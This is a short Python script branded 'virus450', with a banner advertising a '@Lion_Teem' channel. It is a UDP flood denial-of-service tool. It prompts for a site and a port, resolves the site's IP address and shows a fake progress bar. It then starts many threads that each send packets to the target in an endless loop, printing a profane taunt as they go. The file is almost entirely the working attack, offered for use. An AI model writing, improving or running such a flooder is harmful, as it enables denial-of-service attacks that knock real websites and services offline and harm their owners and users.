#kos nant 

import time

import socket

import sys

import _thread

import os

class color:

 CYAN = '\033[96m'

 RED = '\033[91m'

 YELLOW = '\033[93m'

 BLUE = '\033[94m'

 GREEN = '\033[92m'

 END = '\033[0m'

 print ( """

$$$$$$$$$$$$$$$$$$$

$                 $         

$     virus450    $

$                 $  

$    Our channel  $

$    @Lion_Teem   $

$$$$$$$$$$$$$$$$$$$

""" )

site = input(color.YELLOW +"Enter your site url: " + color.END)

thread_count = input(color.YELLOW + "Enter your port: " + color.END)

ip = socket.gethostbyname(site)

PORT = int(thread_count)

os.system("clear")

MESSAGE = 'virus450' 

print(color.CYAN +" IP:" + color.END, ip)

print(color.CYAN + "port:" + color.END, PORT)

time.sleep(2)

os.system("clear")

print("[                    ] 0% " )

time.sleep(1)

print("[=====➣              ] 25%")

time.sleep(1)

print("[==========➣          ] 50%")

time.sleep(1)

print("[===============➣      ] 75%")

time.sleep(1)

print("[====================✔  ] 100%")

time.sleep(1)

os.system("clear")

print(color.BLUE + "Started" + color.END)

time.sleep(1)

os.system("clear")

def ddos(i):

    while 1:

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip,PORT))

        print(color.RED + "[Attack the packet sending website] (doing) <FUCK YOU>\U0001F92B " + color.END)

for i in range(int(thread_count)):

    try:

        _thread.start_new_thread(ddos, ("Thread-" + str(i),))

    except KeyboardInterrupt:

        sys.exit(0)

while 1:

    pass
